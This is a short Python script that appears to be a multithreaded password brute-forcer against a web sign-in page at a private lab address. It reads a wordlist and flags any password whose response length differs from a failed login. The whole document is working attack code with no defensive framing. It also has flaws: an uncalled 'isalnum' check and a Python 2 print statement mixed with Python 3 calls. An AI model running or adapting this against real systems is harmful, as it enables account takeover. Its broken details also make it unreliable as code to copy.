
import threading
import requests
import json
import time




# Number of parallel threads
lock = threading.Semaphore(20)


def parse(password, first):
    new = requests.get("http://10.12.100.119//index.php?page=signin&username=&password=" + password + "&Login=Login", verify=False)

    if(len(new.content) != first):
        print( 'password found: ' + str(password) )
        time.sleep(3)

    # After we done, subtract 1 from the lock
    lock.release()


def main():
    # List of threads objects I so we can handle them later
    thread_pool = []
    first = requests.get("http://10.12.100.119//index.php?page=signin&username=&password=" + "password" + "&Login=Login")
    
    with open("brute.txt", "r") as a_file:
        for index, password in enumerate(a_file):
            password = ''.join(password.split())
            if (password.isalnum):
                thread = threading.Thread(target=parse, args=(password, len(first.content)))
                thread_pool.append(thread)
                print(index)
                thread.start()
                lock.acquire()
        for thread in thread_pool:
            thread.join()

        print 'done'

                
if __name__ == '__main__':
    main()